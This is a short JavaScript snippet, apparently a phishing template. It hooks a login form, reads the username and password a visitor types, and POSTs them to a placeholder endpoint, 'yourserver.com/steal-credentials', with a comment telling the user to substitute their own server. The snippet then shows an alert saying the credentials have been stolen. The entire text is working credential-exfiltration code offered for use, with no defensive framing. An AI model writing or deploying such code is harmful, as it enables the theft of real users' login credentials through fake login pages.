document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  // Send credentials to your server (replace with your server URL)
  fetch("https://yourserver.com/steal-credentials", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ username, password })
  });

  alert("Login successful! Your credentials have been stolen.");
});